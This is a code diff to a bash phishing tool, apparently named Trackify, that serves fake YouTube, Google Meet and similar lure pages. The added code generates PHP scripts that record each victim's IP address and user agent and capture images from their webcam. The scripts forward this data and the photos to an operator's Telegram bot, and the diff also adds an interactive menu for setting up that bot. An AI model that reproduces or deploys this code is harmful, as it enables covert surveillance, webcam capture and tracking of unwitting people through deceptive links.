@@ -270,7 +270,247 @@ if [[ -z "$link" ]]; then
     return 1
 fi
 
+# Generate index.php with forwarding link
 sed 's+forwarding_link+'$link'+g' template.php > index.php
+
+# Backup original PHP files if backup doesn't exist
+if [[ ! -f "ip.php.backup" ]] && [[ -f "ip.php" ]]; then
+    cp ip.php ip.php.backup 2>/dev/null || true
+fi
+if [[ ! -f "post.php.backup" ]] && [[ -f "post.php" ]]; then
+    cp post.php post.php.backup 2>/dev/null || true
+fi
+
+# Always restore from backup first (if exists) to ensure clean state
+if [[ -f "ip.php.backup" ]]; then
+    cp ip.php.backup ip.php 2>/dev/null || true
+fi
+if [[ -f "post.php.backup" ]]; then
+    cp post.php.backup post.php 2>/dev/null || true
+fi
+
+# Generate ip.php with Telegram configuration if enabled
+if [[ "$telegram_enabled" == "1" ]]; then
+    # Escape single quotes for PHP string
+    telegram_token_php=$(printf '%s' "$telegram_token" | sed "s/'/\\\\'/g")
+    telegram_chat_php=$(printf '%s' "$telegram_chat" | sed "s/'/\\\\'/g")
+    
+    # Create ip.php with Telegram support (use quoted heredoc to prevent bash expansion)
+    cat > ip.php << 'IPEOF'
+<?php
+
+if (!empty($_SERVER['HTTP_CLIENT_IP']))
+    {
+      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
+    }
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
+    {
+      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
+    }
+else
+    {
+      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
+    }
+$useragent = " User-Agent: ";
+$browser = $_SERVER['HTTP_USER_AGENT'];
+
+$file = 'ip.txt';
+$victim = "IP: ";
+$fp = fopen($file, 'a');
+
+fwrite($fp, $victim);
+fwrite($fp, $ipaddress);
+fwrite($fp, $useragent);
+fwrite($fp, $browser);
+
+fclose($fp);
+
+// Send to Telegram
+$telegram_token = 'TELEGRAM_TOKEN_PLACEHOLDER';
+$telegram_chat = 'TELEGRAM_CHAT_PLACEHOLDER';
+
+// Escape special characters in message
+$ip_clean = trim($ipaddress);
+$browser_clean = htmlspecialchars($browser, ENT_QUOTES, 'UTF-8');
+$message = "🔔 *New Target Opened Link*\n\n";
+$message .= "📍 *IP Address:* " . $ip_clean . "\n";
+$message .= "🌐 *User Agent:* " . $browser_clean . "\n";
+$message .= "⏰ *Time:* " . date('Y-m-d H:i:s') . "\n";
+
+$url = "https://api.telegram.org/bot" . $telegram_token . "/sendMessage";
+$data = array(
+    'chat_id' => $telegram_chat,
+    'text' => $message,
+    'parse_mode' => 'Markdown'
+);
+
+$options = array(
+    'http' => array(
+        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
+        'method' => 'POST',
+        'content' => http_build_query($data),
+        'timeout' => 10,
+        'ignore_errors' => true
+    )
+);
+
+$context = stream_context_create($options);
+$result = @file_get_contents($url, false, $context);
+
+// Log errors if any
+if ($result === false) {
+    $error = error_get_last();
+    if ($error !== null) {
+        error_log("Telegram send error: " . $error['message'], 3, "telegram_error.log");
+    }
+}
+IPEOF
+    
+    # Replace placeholders with actual values using perl or sed
+    if command -v perl > /dev/null 2>&1; then
+        perl -i -pe "s|TELEGRAM_TOKEN_PLACEHOLDER|$telegram_token_php|g" ip.php
+        perl -i -pe "s|TELEGRAM_CHAT_PLACEHOLDER|$telegram_chat_php|g" ip.php
+    elif command -v python > /dev/null 2>&1; then
+        python -c "import sys; data=open('ip.php','r',encoding='utf-8').read(); data=data.replace('TELEGRAM_TOKEN_PLACEHOLDER','$telegram_token_php'); data=data.replace('TELEGRAM_CHAT_PLACEHOLDER','$telegram_chat_php'); open('ip.php','w',encoding='utf-8').write(data)"
+    else
+        # Use sed (Windows Git Bash compatible)
+        if [[ -n "$WINDIR" ]] || [[ "$OSTYPE" == "msys" ]]; then
+            sed -i "s|TELEGRAM_TOKEN_PLACEHOLDER|$telegram_token_php|g" ip.php
+            sed -i "s|TELEGRAM_CHAT_PLACEHOLDER|$telegram_chat_php|g" ip.php
+        else
+            sed -i.bak "s|TELEGRAM_TOKEN_PLACEHOLDER|$telegram_token_php|g" ip.php
+            sed -i.bak "s|TELEGRAM_CHAT_PLACEHOLDER|$telegram_chat_php|g" ip.php
+            rm -f ip.php.bak 2>/dev/null || true
+        fi
+    fi
+fi
+
+# Generate post.php with Telegram configuration if enabled
+if [[ "$telegram_enabled" == "1" ]]; then
+    # Escape single quotes for PHP string (reuse variables from ip.php generation)
+    telegram_token_php=$(printf '%s' "$telegram_token" | sed "s/'/\\\\'/g")
+    telegram_chat_php=$(printf '%s' "$telegram_chat" | sed "s/'/\\\\'/g")
+    
+    cat > post.php << 'POSTEOF'
+<?php
+
+$date = date('dMYHis');
+$imageData=$_POST['cat'];
+
+if (!empty($_POST['cat'])) {
+error_log("Received" . "\r\n", 3, "Log.log");
+}
+
+// Create folder name with current date only
+$folderName = date('Y-m-d');
+
+// Create folder if it doesn't exist
+if (!file_exists($folderName)) {
+    mkdir($folderName, 0777, true);
+}
+
+$filteredData=substr($imageData, strpos($imageData, ",")+1);
+$unencodedData=base64_decode($filteredData);
+$filePath = $folderName . '/cam' . $date . '.png';
+$fp = fopen($filePath, 'wb');
+fwrite($fp, $unencodedData);
+fclose($fp);
+
+// Send to Telegram
+$telegram_token = 'TELEGRAM_TOKEN_PLACEHOLDER';
+$telegram_chat = 'TELEGRAM_CHAT_PLACEHOLDER';
+
+// Send photo to Telegram using cURL if available, otherwise use file_get_contents
+$url = "https://api.telegram.org/bot" . $telegram_token . "/sendPhoto";
+$caption = "📸 *Camera Capture*\n\n⏰ *Time:* " . date('Y-m-d H:i:s');
+
+if (function_exists('curl_file_create')) {
+    // Use cURL (preferred method)
+    $cfile = curl_file_create($filePath, 'image/png', 'cam' . $date . '.png');
+    $data = array(
+        'chat_id' => $telegram_chat,
+        'photo' => $cfile,
+        'caption' => $caption,
+        'parse_mode' => 'Markdown'
+    );
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    $result = curl_exec($ch);
+    $error = curl_error($ch);
+    curl_close($ch);
+    
+    if ($error) {
+        error_log("Telegram cURL error: " . $error, 3, "telegram_error.log");
+    }
+} else {
+    // Fallback to file_get_contents with multipart
+    $boundary = uniqid();
+    $delimiter = '-------------' . $boundary;
+    
+    $postData = '';
+    $postData .= "--" . $delimiter . "\r\n";
+    $postData .= 'Content-Disposition: form-data; name="chat_id"' . "\r\n\r\n";
+    $postData .= $telegram_chat . "\r\n";
+    
+    $postData .= "--" . $delimiter . "\r\n";
+    $postData .= 'Content-Disposition: form-data; name="photo"; filename="cam' . $date . '.png"' . "\r\n";
+    $postData .= 'Content-Type: image/png' . "\r\n\r\n";
+    $postData .= $unencodedData . "\r\n";
+    
+    $postData .= "--" . $delimiter . "\r\n";
+    $postData .= 'Content-Disposition: form-data; name="caption"' . "\r\n\r\n";
+    $postData .= $caption . "\r\n";
+    $postData .= "--" . $delimiter . "--\r\n";
+    
+    $options = array(
+        'http' => array(
+            'method' => 'POST',
+            'header' => 'Content-Type: multipart/form-data; boundary=' . $delimiter,
+            'content' => $postData,
+            'timeout' => 10,
+            'ignore_errors' => true
+        )
+    );
+    
+    $context = stream_context_create($options);
+    $result = @file_get_contents($url, false, $context);
+    
+    if ($result === false) {
+        $error = error_get_last();
+        if ($error !== null) {
+            error_log("Telegram send error: " . $error['message'], 3, "telegram_error.log");
+        }
+    }
+}
+
+exit();
+?>
+POSTEOF
+    
+    # Replace placeholders with actual values using perl or sed
+    if command -v perl > /dev/null 2>&1; then
+        perl -i -pe "s|TELEGRAM_TOKEN_PLACEHOLDER|$telegram_token_php|g" post.php
+        perl -i -pe "s|TELEGRAM_CHAT_PLACEHOLDER|$telegram_chat_php|g" post.php
+    elif command -v python > /dev/null 2>&1; then
+        python -c "import sys; data=open('post.php','r',encoding='utf-8').read(); data=data.replace('TELEGRAM_TOKEN_PLACEHOLDER','$telegram_token_php'); data=data.replace('TELEGRAM_CHAT_PLACEHOLDER','$telegram_chat_php'); open('post.php','w',encoding='utf-8').write(data)"
+    else
+        # Use sed (Windows Git Bash compatible)
+        if [[ -n "$WINDIR" ]] || [[ "$OSTYPE" == "msys" ]]; then
+            sed -i "s|TELEGRAM_TOKEN_PLACEHOLDER|$telegram_token_php|g" post.php
+            sed -i "s|TELEGRAM_CHAT_PLACEHOLDER|$telegram_chat_php|g" post.php
+        else
+            sed -i.bak "s|TELEGRAM_TOKEN_PLACEHOLDER|$telegram_token_php|g" post.php
+            sed -i.bak "s|TELEGRAM_CHAT_PLACEHOLDER|$telegram_chat_php|g" post.php
+            rm -f post.php.bak 2>/dev/null || true
+        fi
+    fi
+fi
+
 if [[ $option_tem -eq 1 ]]; then
 sed 's+forwarding_link+'$link'+g' Youtube.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
@@ -279,6 +519,88 @@ elif [[ $option_tem -eq 2 ]]; then
 sed 's+forwarding_link+'$link'+g' Gmeet.html > index2.html
 elif [[ $option_tem -eq 3 ]]; then
 sed 's+forwarding_link+'$link'+g' Sensitive.html > index2.html
+fi
+}
+
+normalize_telegram_chat() {
+local chat="$1"
+# If it's already a chat ID (numeric, can be negative), use as is
+if [[ "$chat" =~ ^-?[0-9]+$ ]]; then
+    echo "$chat"
+# If it starts with @, use as is
+elif [[ "$chat" =~ ^@ ]]; then
+    echo "$chat"
+# Otherwise, add @ prefix for username
+else
+    echo "@$chat"
+fi
+}
+
+test_telegram_bot() {
+local test_message="✅ Trackify Telegram bot is configured correctly!\n\nThis is a test message."
+local url="https://api.telegram.org/bot${telegram_token}/sendMessage"
+local data="chat_id=${telegram_chat}&text=${test_message}&parse_mode=Markdown"
+
+if command -v curl > /dev/null 2>&1; then
+    response=$(curl -s -X POST "$url" -d "$data" 2>&1)
+elif command -v wget > /dev/null 2>&1; then
+    response=$(wget -qO- --post-data="$data" "$url" 2>&1)
+else
+    printf "\e[1;93m[!] curl or wget not found. Cannot test Telegram connection.\e[0m\n"
+    printf "\e[1;93m[!] Please make sure your bot token and chat ID are correct.\e[0m\n"
+    return 1
+fi
+
+if echo "$response" | grep -q '"ok":true'; then
+    printf "\e[1;92m[\e[0m+\e[1;92m] Telegram bot test successful! Check your Telegram for the test message.\e[0m\n"
+    return 0
+else
+    printf "\e[1;91m[!] Telegram bot test failed!\e[0m\n"
+    printf "\e[1;93m[!] Response: %s\e[0m\n" "$response"
+    printf "\e[1;93m[!] Common issues:\e[0m\n"
+    printf "\e[1;93m    - Invalid bot token\e[0m\n"
+    printf "\e[1;93m    - Bot hasn't been started (send /start to your bot first)\e[0m\n"
+    printf "\e[1;93m    - Invalid username/chat ID\e[0m\n"
+    printf "\e[1;93m    - Username must start with @ or be a numeric chat ID\e[0m\n"
+    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Continue anyway? [y/N]: \e[0m' continue_anyway
+    if [[ ! "$continue_anyway" =~ ^[Yy]$ ]]; then
+        select_notification
+    fi
+    return 1
+fi
+}
+
+select_notification() {
+printf "\n-----Choose notification method----\n"
+printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Default (Local file)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Telegram Bot\e[0m\n"
+default_option_notification="1"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose notification method: [Default is 1] \e[0m' option_notification
+option_notification="${option_notification:-${default_option_notification}}"
+if [[ $option_notification -eq 1 ]]; then
+printf "\e[1;93m[\e[0m*\e[1;93m] Selected: Default (Local file)\e[0m\n"
+telegram_enabled="0"
+elif [[ $option_notification -eq 2 ]]; then
+printf "\e[1;93m[\e[0m*\e[1;93m] Selected: Telegram Bot\e[0m\n"
+telegram_enabled="1"
+printf "\e[1;93m[\e[0m*\e[1;93m] Note: Get your bot token from @BotFather on Telegram\e[0m\n"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Telegram Bot Token: \e[0m' telegram_token
+printf "\e[1;93m[\e[0m*\e[1;93m] Note: Enter YOUR username (where bot will send data), NOT the bot username\e[0m\n"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YOUR Telegram Username (e.g., yourusername) or Chat ID: \e[0m' telegram_chat_input
+if [[ -z "$telegram_token" ]] || [[ -z "$telegram_chat_input" ]]; then
+printf "\e[1;93m [!] Telegram token and username/chat_id are required!\e[0m\n"
+sleep 1
+select_notification
+else
+telegram_chat=$(normalize_telegram_chat "$telegram_chat_input")
+printf "\e[1;92m[\e[0m*\e[1;92m] Using chat identifier: %s\e[0m\n" "$telegram_chat"
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Testing Telegram bot connection...\e[0m\n"
+test_telegram_bot
+fi
+else
+printf "\e[1;93m [!] Invalid notification option! try again\e[0m\n"
+sleep 1
+select_notification
 fi
 }
 
@@ -408,6 +730,7 @@ fi
 
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 
+select_notification
 select_template
 select_tunnel
 
